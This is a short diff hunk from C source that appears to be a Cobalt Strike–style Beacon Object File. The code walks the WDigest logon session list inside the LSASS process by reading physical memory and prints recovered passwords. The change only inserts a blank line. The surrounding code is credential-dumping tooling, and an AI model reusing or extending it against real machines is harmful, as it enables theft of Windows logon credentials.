@@ -141,6 +141,7 @@ BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHea
         {
             BeaconFormatPrintf(&outputbuffer, "\t    * Password    : (null)\n");
         }
+        
         BeaconFormatPrintf(&outputbuffer, "\n");
         TranslateUVA2Physical(Flink, &tmpPA, lower32bits, LsassPID);
         Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);
